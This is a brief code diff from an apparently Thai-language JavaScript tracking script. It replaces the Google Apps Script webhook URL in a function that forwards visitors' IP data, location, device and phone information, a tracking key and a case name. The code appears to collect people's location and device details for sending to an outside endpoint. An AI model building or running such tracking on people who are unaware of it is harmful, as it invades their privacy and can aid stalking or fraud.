@@ -469,7 +469,7 @@ function createDetailedMessage(ipData, location, timestamp, deviceData, phoneInf
 
 function sendToLineNotify(ipData, location, timestamp, referrer, deviceData, phoneInfo, trackingKey, caseName) {
   // ส่งเฉพาะข้อมูลดิบไปที่ webhook โดยไม่สร้างข้อความเอง
-  const webhookUrl = 'https://script.google.com/macros/s/AKfycbwBH3MdNRaqnB2iVkCMU2fdGg2fUAXawHUIxjH68ZdC1MFKpl3iu14UCbpkyn0h4eT7pg/exec';
+  const webhookUrl = 'https://script.google.com/macros/s/AKfycbwCnAcjywcDAJLBo_zs6Fy1EN8wI-7SmuhQJo-1sLsmY_kfas00jTI1cUkGQhVEL5DsQg/exec';
 
   // ส่งข้อมูลพื้นฐานทั้งหมดโดยไม่สร้างข้อความ message เอง
   const dataToSend = {
